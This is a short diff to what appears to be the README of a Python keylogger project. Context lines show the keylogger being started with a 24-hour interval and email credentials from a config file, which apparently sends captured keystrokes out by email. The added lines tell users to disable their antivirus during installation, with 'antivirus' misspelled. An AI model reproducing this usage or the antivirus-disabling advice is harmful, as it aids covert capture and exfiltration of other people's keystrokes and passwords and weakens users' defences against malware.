@@ -36,3 +36,6 @@ import config
 my_keylogger = keylogger.Keylogger(86400, config.EMAIL, config.PASSWORD)
 my_keylogger.start()
 ```
+# Warning
+
+Atnivirus may issue a warning about infection, disable the antivirus for installation
